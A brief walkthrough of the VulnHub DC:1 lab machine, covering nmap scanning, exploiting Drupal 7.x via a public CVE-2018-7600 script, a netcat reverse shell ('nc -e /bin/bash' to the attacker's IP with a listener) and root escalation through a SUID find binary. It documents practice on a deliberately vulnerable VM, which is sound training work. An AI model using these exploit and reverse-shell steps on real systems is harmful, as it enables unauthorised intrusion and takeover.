
# DC:1 Walkthrough 

**VulnHub Link:** [DC:1](https://www.vulnhub.com/entry/dc-1,292/)
**Difficulty:** Easy
**Release Date:** 28 Feb 2019


## 1.Reconnaissance

nmap -A -O -T4 -P -sV 192.168.100.139


## 2.Web Enumeration

whatweb http://192.168.100.139

--> drupal 7.x 

https://github.com/firefart/CVE-2018-7600/tree/master 

from here we copied or downloaded python script 

changing HOST to .139


## 3.Exploitation 

python exploit.py

we changed name in script to : nc -e /bin/bash 192.168.100.14 1234 

but before this , you make sure this listens : rlwrap nc -nvlp 1234 on host


## 4.Privilege Escalation

we found out from :: find / -perm /4000 2>/dev/null
find has suid byte

https://gtfobins.github.io/gtfobins/find/

whoami --> root

BINGO!!! Root flag captured.!
